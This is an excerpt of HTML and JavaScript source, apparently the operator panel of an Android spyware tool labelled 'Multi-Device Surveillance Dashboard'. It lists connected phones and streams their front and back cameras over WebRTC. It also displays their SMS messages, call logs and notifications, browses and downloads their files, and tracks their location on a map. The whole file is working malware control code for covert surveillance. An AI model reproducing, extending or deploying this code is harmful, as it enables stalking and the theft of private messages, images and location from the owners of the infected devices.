...
<head>
    ...
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        ...
        /* ---- Login redirect overlay (hidden by default) ---- */
        #authOverlay {
            display: none;
...
<div id="ashLoadingOverlay">
    <div>
        ...
        <div class="ash-label">INITIALIZING SECURE SESSION…</div>
    </div>
</div>

<!-- Auth redirect overlay -->
<div id="authOverlay">Session expired. Redirecting to login…</div>
...
<div class="app-shell">
    ...
    <div class="dashboard" id="dashboard">
        ...
        <!-- Dashboard content (hidden until device selected) -->
...
<script>
// ============================================================
// Multi-Device Surveillance Dashboard
// ============================================================
...
// Map: deviceSocketId -> { socketId, name, online, peer, frontTrack, backTrack }
const devices = {};
let selectedDeviceId = null;
let leafletMap       = null;
let leafletMarker    = null;

const socket = io({ transports: ['websocket'], reconnectionAttempts: Infinity });

// ---- Loader ----
const overlay = document.getElementById('ashLoadingOverlay');
function hideLoader() {
    overlay?.classList.add('ash-hide');
    overlay?.addEventListener('transitionend', () => overlay.remove(), { once: true });
}
window.addEventListener('load', () => setTimeout(hideLoader, 2000));
socket.on('connect', () => { updateStatus('✅ Server Connected', '#00ff00'); setTimeout(hideLoader, 800); });
...
// ---- Debug Log ----
function log(msg) {
    const el = document.getElementById('logMessages');
    if (!el) return;
...
function renderSidebar() {
    ...
    if (ids.length === 0) {
        list.innerHTML = '<div class="no-devices">No devices online yet…</div>';
        return;
    }
    list.innerHTML = '';
    ids.forEach(id => {
...
function selectDevice(id) {
    ...
    // Attach video tracks for selected device
...
function attachVideoTracks(id) {
    const d = devices[id];
    if (!d) return;
    const frontVid = document.getElementById('remoteVideoFront');
    const backVid  = document.getElementById('remoteVideoBack');
    if (d.frontTrack) {
        const s = new MediaStream([d.frontTrack]);
        frontVid.srcObject = s;
    } else { frontVid.srcObject = null; }
    if (d.backTrack) {
        const s = new MediaStream([d.backTrack]);
        backVid.srcObject = s;
    } else { backVid.srcObject = null; }
}

function clearDataPanels() {
    ['notificationList','callLogList','smsList'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.innerHTML = '';
    });
    document.getElementById('fileList').innerHTML = '<div style="color:#336633;text-align:center;padding:20px">Waiting for data…</div>';
...
socket.on('connect_error', e => { updateStatus('⚠ Connect error', '#ffaa00'); log('Socket error: ' + e.message); });

// New Android device connected
socket.on('android-device-connected', data => {
    const id   = data.socketId || data.id;
    const name = data.name || ('Device-' + id.substring(0, 6));
    if (!devices[id]) {
        devices[id] = { socketId: id, name, online: true, peer: null, frontTrack: null, backTrack: null };
    } else {
    ...
    // Start WebRTC for this device
    initPeerForDevice(id);
});

// Device list on initial connect (server sends all known devices)
socket.on('device-list', list => {
    list.forEach(d => {
        const id   = d.socketId || d.id;
        const name = d.name || ('Device-' + id.substring(0, 6));
        devices[id] = { socketId: id, name, online: d.online !== false, peer: null, frontTrack: null, backTrack: null };
    });
    renderSidebar();
...
socket.on('android-device-disconnected', data => {
    ...
    if (devices[id]) {
        ...
        if (selectedDeviceId === id) {
            updateStatus('⚠ Device disconnected', '#ffaa00');
        }
    }
});

// web-client-ready (legacy single-device) — kept for compatibility
socket.on('web-client-ready', id => {
    log('Web client ready: ' + id);
    updateStatus('✅ Device paired', '#00ff00');
});
...
socket.on('signal', msg => {
    ...
    if (!devices[fromId]) {
        devices[fromId] = { socketId: fromId, name: 'Device-' + fromId.substring(0,6), online: true, peer: null, frontTrack: null, backTrack: null };
        renderSidebar();
    }
    handleSignal(fromId, msg.signal);
});

// Data events — only display if from selected device
...
socket.on('call_log', msg => {
    ...
    (msg.call_logs || []).forEach(c => {
        ...
        div.innerHTML = `<p>${escHtml(c.type)}: ${escHtml(c.number)}</p><p class="timestamp">${escHtml(c.date)} · ${c.duration}s</p>`;
        list.appendChild(div);
    });
});
...
socket.on('sms', msg => {
    ...
    (msg.sms_messages || []).forEach(s => {
        ...
        div.innerHTML = `<p>${escHtml(s.type)} · ${escHtml(s.address)}</p><p>${escHtml(s.body?.substring(0,120) || '')}</p><p class="timestamp">${escHtml(s.date)}</p>`;
        list.appendChild(div);
    });
});
...
socket.on('fs:files', msg => {
    if (msg.from !== selectedDeviceId) return;
    renderFileList(msg.file_list);
});
...
function initPeerForDevice(id) {
    ...
    peer.ontrack = e => {
        log('Track from ' + devices[id].name + ': ' + e.track.kind);
        if (e.track.kind === 'video') {
            if (!devices[id].frontTrack) {
                devices[id].frontTrack = e.track;
            } else {
                devices[id].backTrack = e.track;
            }
    ...
    try {
        if (signal.type === 'offer') {
            if (peer.signalingState !== 'stable') {
                log('Peer not stable, resetting for ' + fromId);
                initPeerForDevice(fromId);
                return handleSignal(fromId, signal);
            }
            await peer.setRemoteDescription(new RTCSessionDescription(signal));
            const answer = await peer.createAnswer();
            await peer.setLocalDescription(answer);
            socket.emit('signal', { to: fromId, from: socket.id, signal: answer });
...
document.getElementById('fsGoBtn')?.addEventListener('click', () => {
    const path = document.getElementById('fsPathInput')?.value || '/storage/emulated/0/';
    sendToSelected('fs:list', { path });
});
document.getElementById('fsBackBtn')?.addEventListener('click', () => {
    const cur  = document.getElementById('fsPathInput')?.value || '/storage/emulated/0/';
...
function renderFileList(data) {
    ...
    if (!data.files || data.files.length === 0) {
        el.innerHTML = '<div style="color:#336633;text-align:center;padding:16px">Empty folder</div>'; return;
    }
    data.files.forEach(f => {
        ...
        if (f.isDir) {
            ...
            dlBtn.textContent = '⬇';
            dlBtn.style.cssText = 'padding:2px 6px;background:transparent;border:1px solid #00ff00;color:#00ff00;border-radius:4px;cursor:pointer;font-size:0.7rem;';
            dlBtn.onclick = e => { e.stopPropagation(); sendToSelected('fs:download', { path: f.path }); };
...
function updateMap(lat, lng) {
    ...
    if (leafletMarker) { leafletMarker.setLatLng(latlng); }
    else { leafletMarker = L.marker(latlng).addTo(leafletMap); }
